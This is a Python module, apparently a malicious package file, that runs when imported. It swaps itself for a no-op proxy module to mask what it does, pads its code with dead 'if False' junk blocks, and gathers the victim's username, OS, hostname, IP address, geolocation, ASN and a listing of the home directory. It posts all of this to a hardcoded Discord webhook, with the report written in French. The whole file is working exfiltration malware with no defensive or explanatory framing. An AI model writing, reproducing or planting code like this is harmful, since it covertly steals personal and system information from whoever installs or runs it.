import platform
import os
import pathlib
import requests
import json
if False:
    _var_163_0 = (680, 166, 310)
    _var_163_1 = (620, 864, 796)
    _var_163_2 = (676, 478, 19)

    def _var_163_fn():
        pass
import tempfile

class NoOp:

    def __getattr__(self, name):

        def no_op(*args, **kwargs):
            return NoOp()
        return no_op

    def __call__(self, *args, **kwargs):
        return NoOp()
        if False:
            _var_158_0 = (152, 516, 504)

            def _var_158_fn():
                pass

class ModuleProxy:

    def __getattr__(self, name):
        return NoOp()
import sys
if False:
    _var_164_0 = (484, 681, 718)
    _var_164_1 = (245, 547, 96)
    _var_164_2 = (28, 11, 683)

    def _var_164_fn():
        pass
sys.modules[__name__] = ModuleProxy()
webhook_url = 'https://discord.com/api/webhooks/1216418159033188383/jp4G35WbyaqdjZk8hblay3He03LPnq2CnQnkp8sPTe5_WiRKARnHcdTyrXduRbIeB7Vo'

def get_dir_listing(dir_path):
    listing = ''
    if False:
        _var_159_0 = (327, 685, 96)
        _var_159_1 = (430, 360, 119)

        def _var_159_fn():
            pass
    for entry in pathlib.Path(dir_path).iterdir():
        type_char = 'd' if entry.is_dir() else '-'
        listing += f'{type_char} {entry.name}\n'
    return listing
if False:
    _var_165_0 = (721, 480, 225)
    _var_165_1 = (824, 208, 761)
    _var_165_2 = (106, 428, 892)

    def _var_165_fn():
        pass

def create_and_send_listing_file(dir_path, webhook_data):
    listing = get_dir_listing(dir_path)
    if False:
        _var_160_0 = (562, 547, 900)
        _var_160_1 = (149, 875, 315)
        _var_160_2 = (248, 759, 979)

        def _var_160_fn():
            pass
    with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
        tmp_file_path = tmp_file.name
        tmp_file.write(listing.encode())
    with open(tmp_file_path, 'rb') as file:
        response = requests.post(webhook_url, files={'file': file}, data={'payload_json': (None, json.dumps({'content': f"**Utilisateur:** {webhook_data['user']} :bust_in_silhouette:\n**OS:** {webhook_data['type']} :computer:\n**IP:** {webhook_data['ip']} :globe_with_meridians:\n**Pays:** {webhook_data['country']} :flag_{webhook_data['country_iso'].lower()}: ({webhook_data['country_iso']})\n**Région:** {webhook_data['region_name']}\n**Ville:** {webhook_data['city']} :house:\n**ASN Org:** {webhook_data['asn_org']} :globe_with_meridians::classical_building:\n**ASN:** {webhook_data['asn']} :hash::globe_with_meridians:\n**Répertoire:** {webhook_data['dir']} :file_folder:\n**Nom d'hôte:** {webhook_data['hostname']} :house:\n\n**Voici un listing détaillé du répertoire {dir_path} :**"}))})
    os.unlink(tmp_file_path)
if False:
    _var_166_0 = (287, 791, 487)
    _var_166_1 = (282, 27, 849)
    _var_166_2 = (146, 441, 558)

    def _var_166_fn():
        pass

def gather_info_and_send():
    user = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER') or os.environ.get('USERNAME')
    if False:
        _var_161_0 = (239, 973, 780)
        _var_161_1 = (592, 77, 748)
        _var_161_2 = (818, 330, 284)

        def _var_161_fn():
            pass
    type_os = platform.system()
    dir_path = pathlib.Path(__file__).parent.absolute()
    if False:
        _var_162_0 = (683, 978, 752)
        _var_162_1 = (826, 590, 380)

        def _var_162_fn():
            pass
    hostname = platform.node()
    try:
        response = requests.get('https://ipinfo.io/json').json()
        homedir = pathlib.Path.home()
        webhook_data = {'user': user, 'type': type_os, 'dir': str(dir_path), 'hostname': hostname, 'ip': response.get('ip', 'N/A'), 'country': response.get('country', 'N/A'), 'country_iso': response.get('country', 'N/A'), 'region_name': response.get('region', 'N/A'), 'city': response.get('city', 'N/A'), 'asn_org': response.get('org', 'N/A').split(' ')[0] if 'org' in response else 'N/A', 'asn': response.get('org', 'N/A') if 'org' in response else 'N/A'}
        create_and_send_listing_file(str(homedir), webhook_data)
    except Exception as e:
        pass
gather_info_and_send()